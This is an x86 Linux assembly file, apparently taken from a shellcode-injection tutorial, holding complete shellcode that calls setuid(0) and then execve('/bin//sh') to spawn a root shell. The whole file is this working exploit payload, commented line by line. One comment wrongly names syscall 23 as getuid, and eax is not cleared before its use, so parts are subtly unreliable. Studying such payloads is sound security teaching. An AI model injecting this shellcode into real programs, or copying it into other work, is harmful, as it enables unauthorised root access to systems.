;Shellcode to spawn a shell
;
;https://dhavalkapil.com/blogs/Shellcode-Injection/

; Call setuid(0)
xor    ebx, ebx     ;Clearing ebx register
mov    al, 23       ;syscall number of getuid is 23
int    0x80         ;Make the system call

; Call /bin/sh
xor     eax, eax    ;Clearing eax register
push    eax         ;Pushing NULL bytes
push    0x68732f2f  ;Pushing //sh
push    0x6e69622f  ;Pushing /bin
mov     ebx, esp    ;ebx now contains address of /bin//sh
push    eax         ;Pushing NULL byte
mov     edx, esp    ;edx now contains address of NULL byte
push    ebx         ;Pushing address of /bin//sh
mov     ecx, esp    ;ecx now contains address of address of /bin//sh byte
mov     al, 11      ;syscall number of execve is 11
int     0x80        ;Make the system call
